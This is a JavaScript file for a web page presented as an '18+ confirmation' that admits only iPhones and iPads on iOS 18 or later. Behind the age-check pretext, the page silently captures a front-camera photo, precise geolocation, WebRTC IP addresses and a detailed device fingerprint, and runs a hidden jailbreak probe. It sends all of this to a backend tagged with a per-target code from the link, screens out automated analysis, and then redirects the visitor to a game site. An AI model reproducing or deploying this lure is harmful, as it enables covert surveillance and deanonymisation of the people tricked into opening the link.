// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18) ===

// API base из <script>window.__API_BASE</script> в index.html
const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

// ==== UI ====
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
  reason: document.getElementById("reason"),
  title: document.getElementById("title"),
};

// === Подготовка input для фолбэка ===
(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.id = "fileInp";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

window.__reportReady = false;
window.__cameraLatencyMs = null;
window.__lastDeviceCheck = null;
window.__lastClientProfileForScore = null;

// ===================== Jailbreak probe (soft) =====================
window.__jbProbe = null; // кэш результата на сессию

const JB_SCHEMES = [
  "cydia://package/com.saurik.substrate",
  "sileo://package/com.opa334.trollstore",
  "zebra://",
  "zbra://",
  "filza://",
  "apt://",
  "installer://",
  "odyssey://",
  "chimera://",
  "saily://"
];

// Тихо проверяем схему в скрытом iframe и наблюдаем visibility/pagehide
function probeCustomSchemeOnce(url, timeout = 1200) {
  return new Promise((resolve) => {
    let done = false, visHit = false, pageHideHit = false;

    const onVis = () => { if (document.hidden) visHit = true; };
    const onPageHide = () => { pageHideHit = true; };

    document.addEventListener("visibilitychange", onVis, { passive: true });
    window.addEventListener("pagehide", onPageHide, { passive: true });

    const iframe = document.createElement("iframe");
    iframe.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:0;height:0;border:0;visibility:hidden;";
    document.body.appendChild(iframe);

    const cleanup = (result) => {
      if (done) return;
      done = true;
      try { document.removeEventListener("visibilitychange", onVis); } catch {}
      try { window.removeEventListener("pagehide", onPageHide); } catch {}
      try { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch {}
      resolve(result);
    };

    const t = setTimeout(() => {
      clearTimeout(t);
      cleanup({ installedLikely: false, visibilityChange: visHit, pageHide: pageHideHit, timeoutMs: timeout });
    }, timeout);

    try { iframe.src = url; } catch {}

    let checks = 0;
    const tick = () => {
      if (done) return;
      checks++;
      if (visHit || pageHideHit) {
        clearTimeout(t);
        cleanup({ installedLikely: true, visibilityChange: visHit, pageHide: pageHideHit, timeoutMs: checks * 16 });
        return;
      }
      if (checks < Math.ceil(timeout / 16)) requestAnimationFrame(tick);
    };
    requestAnimationFrame(tick);
  });
}

async function runJailbreakProbe(timeoutPerScheme = 1200) {
  if (window.__jbProbe && typeof window.__jbProbe === "object") return window.__jbProbe;

  const results = [];
  for (const scheme of JB_SCHEMES) {
    /* eslint-disable no-await-in-loop */
    const r = await probeCustomSchemeOnce(scheme, timeoutPerScheme);
    results.push({ scheme, ...r });
    if (r.installedLikely) {
      window.__jbProbe = { likelyJailbroken: true, hit: { scheme, ...r }, results };
      return window.__jbProbe;
    }
    await new Promise(res => setTimeout(res, 120));
  }
  window.__jbProbe = { likelyJailbroken: false, hit: null, results };
  return window.__jbProbe;
}

// ===================== VPN/Proxy guess (эвристика) =====================

// Быстрый маппинг таймзоны -> страна (частично, можно расширять)
function tzToCountryGuess(tz) {
  if (!tz) return null;
  const t = tz.toLowerCase();
  if (t.includes("chisinau")) return "MD";
  if (t.includes("kyiv") || t.includes("kiev") || t.includes("ukraine")) return "UA";
  if (t.includes("moscow")) return "RU";
  if (t.includes("warsaw")) return "PL";
  if (t.includes("berlin")) return "DE";
  if (t.includes("vienna")) return "AT";
  if (t.includes("paris")) return "FR";
  if (t.includes("rome")) return "IT";
  if (t.includes("madrid")) return "ES";
  if (t.includes("helsinki")) return "FI";
  if (t.includes("london")) return "GB";
  if (t.includes("istanbul")) return "TR";
  if (t.includes("new_york")) return "US";
  if (t.includes("los_angeles") || t.includes("vancouver")) return "US";
  if (t.includes("toronto") || t.includes("montreal")) return "CA";
  return null;
}

// Ключевые слова для дата-центров/провайдеров VPN
const DC_ISP_KEYWORDS = [
  "amazon", "aws", "google", "microsoft", "azure", "cloudflare", "digitalocean",
  "hetzner", "ovh", "leaseweb", "choopa", "vultr", "linode", "akamai", "m247",
  "contabo", "scaleway", "ionos", "shinjiru", "serverius", "hivelocity"
];

function looksLikeDatacenter(isp) {
  if (!isp) return false;
  const s = String(isp).toLowerCase();
  return DC_ISP_KEYWORDS.some(k => s.includes(k));
}

/**
 * Эвристическая оценка VPN/Proxy.
 * - publicIp.country vs timezone
 * - ISP-ключевые слова (ДЦ/хостинг)
 * - наличие публичных адресов в webrtcIps
 * - слабые сетевые метрики
 */
function deriveVpnProxyGuess(profile) {
  let score = 0;
  const reasons = [];

  const tz = profile.timezone || null;
  const tzCountry = tzToCountryGuess(tz);
  const pub = profile.publicIp || null; // { ip, country?, region?, isp? }
  const isp = pub?.isp || pub?.org || null;
  const pubCountry = (pub?.country || "").toUpperCase() || null;

  if (looksLikeDatacenter(isp)) {
    score += 4;
    reasons.push(`ISP выглядит как дата-центр (${isp})`);
  }

  if (tzCountry && pubCountry && tzCountry !== pubCountry) {
    score += 3;
    reasons.push(`Таймзона (${tz}) не совпадает со страной IP (${pubCountry})`);
  }

  const webrtc = Array.isArray(profile.webrtcIps) ? profile.webrtcIps : [];
  const hasPublicRtc = webrtc.some(ip =>
    ip && !/^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])|^127\.|^169\.254\./.test(ip) && !/\.local$/i.test(ip)
  );
  if (hasPublicRtc) {
    score += 3;
    reasons.push("WebRTC обнаружил публичные адреса (возможен туннель/прокси)");
  }

  const conn = profile.connection || {};
  if (typeof conn.rtt === "number" && conn.rtt > 300) {
    score += 1;
    reasons.push(`Высокий RTT (${conn.rtt} ms)`);
  }
  if (conn.effectiveType === "2g") {
    score += 1;
    reasons.push("Очень медленный effectiveType (2g)");
  }

  const label =
    score >= 7 ? "likely"
  : score >= 4 ? "possible"
  : "unlikely";

  return { label, score, reasons, tzCountry, pubCountry, isp };
}

// ===================== СБОР КЛИЕНТСКОГО ПРОФИЛЯ =====================

async function getPublicIPViaBackend() {
  if (!API_BASE) return null;
  try {
    const r = await fetch(`${API_BASE}/api/client-ip`, { method: "GET", credentials: "omit" });
    if (!r.ok) return null;
    const data = await r.json().catch(()=>null);
    return data || null; // ожидаем { ip, country?, region?, isp? }
  } catch { return null; }
}

async function getIpsViaWebRTC(timeout = 1800) {
  const ips = new Set();
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      const cand = e.candidate.candidate || "";
      const m = cand.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})|([a-f0-9:]+:[a-f0-9:]+)/);
      if (m) ips.add(m[0]);
    };
    const sdp = await pc.createOffer();
    await pc.setLocalDescription(sdp);
    await new Promise(res => setTimeout(res, timeout));
    try { pc.close(); } catch {}
  } catch {}
  return Array.from(ips);
}

function getWebGLInfoSafe() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    if (!dbg) return null;
    return {
      vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
      renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
    };
  } catch { return null; }
}

async function getBatteryInfo() {
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      return {
        charging: b.charging,
        level: b.level,
        chargingTime: b.chargingTime,
        dischargingTime: b.dischargingTime
      };
    }
  } catch {}
  return null;
}

async function getPermissionsSnapshot() {
  const names = ["geolocation", "camera", "microphone", "notifications", "persistent-storage", "accelerometer", "gyroscope", "magnetometer", "clipboard-read", "clipboard-write"];
  const out = {};
  if (!navigator.permissions?.query) return out;
  await Promise.all(names.map(async n => {
    try { out[n] = (await navigator.permissions.query({ name: n })).state; } catch { /* ignored */ }
  }));
  return out;
}

async function getMediaCapabilitiesSnapshot() {
  const out = {};
  try {
    const mc = navigator.mediaCapabilities;
    if (mc && mc.decodingInfo) {
      const hevc = await mc.decodingInfo({
        type: "file",
        video: {
          contentType: "video/mp4; codecs=\"hvc1.1.6.L93.B0\"",
          width: 1920, height: 1080, bitrate: 4e6, framerate: 30
        }
      }).catch(()=>null);
      out.hevc = hevc || null;
    }
  } catch {}
  return out;
}

async function getStorageEstimate() {
  try {
    if (navigator.storage?.estimate) {
      const est = await navigator.storage.estimate();
      return { quota: est.quota || null, usage: est.usage || null };
    }
  } catch {}
  return null;
}

function getConnectionInfo() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return null;
  return {
    type: c.type || null,
    effectiveType: c.effectiveType || null,
    rtt: c.rtt || null,
    downlink: c.downlink || null,
    saveData: c.saveData || false
  };
}

// Профиль клиента (всё, что можно собрать на фронте)
async function collectClientProfile() {
  const nav = navigator || {};
  const scr = screen || {};

  let plugins = null, mimeTypes = null;
  try { plugins = nav.plugins ? Array.from(nav.plugins).map(p => p.name) : null; } catch {}
  try { mimeTypes = nav.mimeTypes ? Array.from(nav.mimeTypes).map(m => m.type) : null; } catch {}

  const userAgentData = (() => {
    const uad = nav.userAgentData;
    if (!uad) return null;
    return {
      mobile: !!uad.mobile,
      platform: uad.platform || null,
      brands: (uad.brands || uad.uaList || []).map(b => b.brand || b.brandVersion || b)
    };
  })();

  const webgl = getWebGLInfoSafe();
  const battery = await getBatteryInfo();
  const permissions = await getPermissionsSnapshot();
  const mediaCaps = await getMediaCapabilitiesSnapshot();
  const storageEst = await getStorageEstimate();
  const conn = getConnectionInfo();
  const ipsViaRtc = await getIpsViaWebRTC(1800);
  const pubIp = await getPublicIPViaBackend(); // если на бэке сделан эндпоинт — получим точный IP

  const perf = {};
  try {
    const e = performance?.getEntriesByType?.("navigation")?.[0];
    if (e) {
      perf.type = e.type;
      perf.redirectCount = e.redirectCount;
      perf.loadTime = (e.loadEventEnd && e.startTime != null) ? Math.max(0, Math.round(e.loadEventEnd - e.startTime)) : null;
    }
  } catch {}

  const base = {
    timestamp: Date.now(),
    locationHref: location.href,
    referrer: document.referrer || null,
    cookiesEnabled: navigator.cookieEnabled === true,
    languages: navigator.languages || null,
    language: navigator.language || null,
    userAgent: navigator.userAgent || "",
    userAgentData,
    platform: navigator.platform || null,
    vendor: navigator.vendor || null,
    hardwareConcurrency: nav.hardwareConcurrency ?? null,
    deviceMemory: nav.deviceMemory ?? null,
    maxTouchPoints: nav.maxTouchPoints ?? 0,
    dpr: window.devicePixelRatio || 1,
    screen: { width: scr.width || null, height: scr.height || null, availWidth: scr.availWidth || null, availHeight: scr.availHeight || null, colorDepth: scr.colorDepth || null, pixelDepth: scr.pixelDepth || null },
    viewport: { w: window.innerWidth, h: window.innerHeight },
    timezone: (Intl?.DateTimeFormat?.().resolvedOptions?.().timeZone) || null,
    connection: conn,
    storageEstimate: storageEst,
    permissions,
    mediaCapabilities: mediaCaps,
    battery,
    webgl,
    plugins,
    mimeTypes,
    webrtcIps: ipsViaRtc,     // ICE/мднс/иногда публичные
    publicIp: pubIp,          // { ip, country?, region?, isp? } — если API_BASE реализует
    performance: perf,
    visibilityHidden: document.hidden === true,
    historyLength: (history && history.length) || null,
    jbProbe: (window.__jbProbe || null)
  };

  // VPN/Proxy эвристика
  const vpnProxy = deriveVpnProxyGuess(base);

  return { ...base, vpnProxy };
}

// === CODE из URL (?code=...) ===
function determineCode() {
  const q = new URLSearchParams(location.search).get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

// === Кнопка (видимость и стиль мы контролируем тут) ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(35%) brightness(0.9)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg, #246, #39a)";
  b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
  b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
}
function showBtn() { if (UI.btn) UI.btn.style.display = "block"; }
function hideBtn() { if (UI.btn) UI.btn.style.display = "none"; }

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Сжатие base64 фото ===
function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

// === Фото (основной путь, совместимо с iOS) ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
  const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  return new Promise((resolve, reject) => {
    try {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;

      let fallbackTimer = setTimeout(() => {
        try {
          const c = document.createElement("canvas");
          c.width = 1280;
          c.height = 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.8);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (e) { reject(e); }
      }, 3000);

      video.onloadedmetadata = async () => {
        try {
          await video.play();
          clearTimeout(fallbackTimer);
          const c = document.createElement("canvas");
          c.width = video.videoWidth || 1280;
          c.height = video.videoHeight || 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.85);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (err) {
          stream.getTracks().forEach((t) => t.stop());
          reject(err);
        }
      };
    } catch (e) {
      try { stream.getTracks().forEach((t) => t.stop()); } catch {}
      reject(e);
    }
  });
}

// === Фото (фолбэк через input[type=file]) ===
async function takePhotoWithFallback() {
  try {
    return await takePhoto();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

// === Инфо об устройстве (без требования Safari) ===
function getDeviceInfo() {
  const ua = navigator.userAgent || "";
  const m = ua.match(/\bOS\s(\d+)[._]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    // оставим isSafari для обратной совместимости, но он нам не нужен для гейта
    isSafari:
      /Safari\//.test(ua) &&
      !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR/i.test(ua) &&
      navigator.vendor === "Apple Computer, Inc.",
  };
}

// === Лёгкая детекция подмены UA / расширений / автоматизации ===
async function runDeviceCheck() {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    details.ua = navigator.userAgent || "";
    details.vendor = navigator.vendor || "";
    details.platform = navigator.platform || "";
    details.lang = navigator.language || "";
    details.timezone = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
      ? Intl.DateTimeFormat().resolvedOptions().timeZone
      : null;
    details.dpr = window.devicePixelRatio || 1;
    details.screen = { w: (screen && screen.width) || null, h: (screen && screen.height) || null };
    details.hasTouchEvent = ("ontouchstart" in window);
    details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
    details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;

    // Очень мягкие эвристики
    const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
    const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
    if (leakedChromeRuntime || leakedBrowserRuntime) {
      reasons.push("Следы API расширений runtime (инъекция/браузерные плагины)");
      score -= 5;
    }

    function looksNative(fn) {
      try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
      catch { return true; }
    }
    const suspiciousNative =
      !looksNative(navigator.permissions?.query) ||
      !looksNative(navigator.geolocation?.getCurrentPosition) ||
      !looksNative(navigator.mediaDevices?.getUserMedia);

    if (suspiciousNative) {
      reasons.push("Web API переопределены (не native) — подозрительно");
      score -= 5;
    }

    if (details.navigator_webdriver === true) {
      reasons.push("navigator.webdriver === true (автоматизация)");
      score -= 60;
    }

    details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
      reasons.push("Слишком малая cameraLatency — аномально");
      score -= 10;
    }

    // Jailbreak soft-probe (custom URL schemes)
    try {
      const jb = await runJailbreakProbe(1200);
      details.jailbreakProbe = jb;
      if (jb.likelyJailbroken) {
        reasons.push("Найдены признаки jailbreak (схема сработала: " + jb.hit.scheme + ")");
        score -= 25;
      }
    } catch (e) {
      reasons.push("Ошибка jailbreak-probe: " + (e && e.message ? e.message : String(e)));
    }

    // Лёгкий штраф за вероятный VPN/Proxy по собранному профилю
    try {
      const cp = window.__lastClientProfileForScore || null;
      const v = cp?.vpnProxy || null;
      if (v && (v.label === "likely" || v.label === "possible")) {
        const penalty = v.label === "likely" ? 10 : 5;
        score -= penalty;
        reasons.push(`VPN/Proxy: ${v.label} (−${penalty}) — ${v.reasons.slice(0,2).join("; ")}`);
      }
    } catch {}

    if (score >= 80) reasons.push("Ок: окружение выглядит правдоподобно");
    else if (score >= 60) reasons.push("Есть несостыковки — рекомендуется доп. проверка");
    else reasons.push("Высокая вероятность подмены/автоматизации");
  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
  }

  return { score, reasons, details, timestamp: Date.now() };
}

// === Отправка отчёта ===
async function sendReport({ photoBase64, geo, clientProfile }) {
  const info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода в URL");

  const device_check = window.__lastDeviceCheck || null;

  const body = {
    ...info,
    geo,
    photoBase64,
    note: "auto",
    code,
    device_check,
    client_profile: clientProfile || null
  };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const text = await r.text().catch(() => "");
  let data;
  try { data = JSON.parse(text); } catch { data = null; }

  if (!r.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
  if (!data?.ok) throw new Error((data && data.error) || "Ошибка ответа сервера");

  return data;
}

// === ГЕЙТ: пускаем только iPhone/iPad с iOS/iPadOS >= 18 (без требования Safari) ===
const MIN_IOS_MAJOR = 18;

function isIOSFamily() {
  const ua = navigator.userAgent || "";
  const touchMac = navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1; // iPadOS на Mac
  return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
}

function parseIOSMajorFromUA() {
  const ua = navigator.userAgent || "";
  const m1 = ua.match(/\bOS\s+(\d+)[._]/);
  if (m1) return parseInt(m1[1], 10);
  const m2 = ua.match(/\bVersion\/(\d+)/);
  if (m2) return parseInt(m2[1], 10);
  return null;
}

function secureContextOK() {
  return location.protocol === "https:" || location.hostname === "localhost";
}

function gateCheck() {
  if (!secureContextOK())
    return { ok:false, reason:'Нужен HTTPS (или localhost) для доступа к камере/гео.' };
  if (!isIOSFamily())
    return { ok:false, reason:'Доступ только с iPhone/iPad (iOS/iPadOS).' };
  const iosMajor = parseIOSMajorFromUA();
  if (iosMajor == null)
    return { ok:false, reason:'Не удалось определить версию iOS/iPadOS.' };
  if (iosMajor < MIN_IOS_MAJOR)
    return { ok:false, reason:`Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
  return { ok:true, iosMajor };
}

// === Основной поток ===
async function autoFlow() {
  try {
    setBtnLocked();
    if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";

    const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    // Пробуем jail-probe после интеракции/разрешений (надёжнее для iOS/WebView)
    try { await runJailbreakProbe(1200); } catch {}

    // соберём полный клиентский профиль
    const clientProfile = await collectClientProfile();
    window.__lastClientProfileForScore = clientProfile;

    const check = await runDeviceCheck();
    window.__lastDeviceCheck = check;

    if (check.score < 60) {
      window.__reportReady = false;
      setBtnLocked();
      if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена.</span>';
      if (UI.note) UI.note.textContent = "Обнаружены признаки подмены/автоматизации. Отключите расширения/твики.";
      return;
    }

    if (UI.text) UI.text.innerHTML = "Отправляем данные…";
    const resp = await sendReport({ photoBase64, geo, clientProfile });

    window.__reportReady = true;
    setBtnReady();
    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
    if (UI.note) UI.note.textContent = "Можно продолжить.";
    if (resp && resp.delivered === false) {
      if (UI.note) UI.note.textContent = resp.reason || "Доставим позже.";
    }
  } catch (e) {
    console.error("[AUTO-FLOW ERROR]", e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    if (UI.note) UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
  }
}

// Экспорт (если ты всё ещё вызываешь из index.html)
window.__autoFlow = autoFlow;

// === Управление UI кнопкой и запуском, чтобы работало "везде" ===
function applyGateAndUI() {
  const res = gateCheck();
  if (res.ok) {
    // Позитивный UI
    if (UI.title) UI.title.textContent = "Подтверждение 18+";
    if (UI.text) UI.text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
    if (UI.reason) {
      const platIsIPad = /iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent);
      UI.reason.textContent = `${platIsIPad ? "iPadOS" : "iOS"} ${res.iosMajor}.`;
    }
    if (UI.note) UI.note.textContent = "Кнопка активируется после проверки.";
    showBtn();
    setBtnLocked();

    // навешиваем обработчик (без дублей)
    if (UI.btn && !UI.btn.__wired) {
      UI.btn.__wired = true;
      UI.btn.addEventListener("click", (e) => {
        if (!window.__reportReady) { e.preventDefault(); return; }
        location.assign("https://www.pubgmobile.com/ig/itop");
      });
    }

    // стартуем основной поток
    setTimeout(() => autoFlow(), 100);
  } else {
    // Отказ
    if (UI.title) UI.title.textContent = "Доступ отклонён";
    if (UI.text) UI.text.innerHTML = '<span class="err">Отказ в доступе.</span>';
    if (UI.reason) UI.reason.textContent = "Причина: " + res.reason;
    if (UI.note) UI.note.textContent = `Доступ только на iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (любой браузер).`;
    hideBtn();
  }
}

// защита от преждевременного клика
(function guardClick() {
  const btn = UI.btn;
  if (!btn) return;
  btn.addEventListener("click", (e) => {
    if (!window.__reportReady) {
      e.preventDefault();
      e.stopPropagation();
    }
  }, { capture: true });
})();

// Старт после готовности DOM
if (document.readyState === "complete" || document.readyState === "interactive") {
  applyGateAndUI();
} else {
  document.addEventListener("DOMContentLoaded", applyGateAndUI);
}
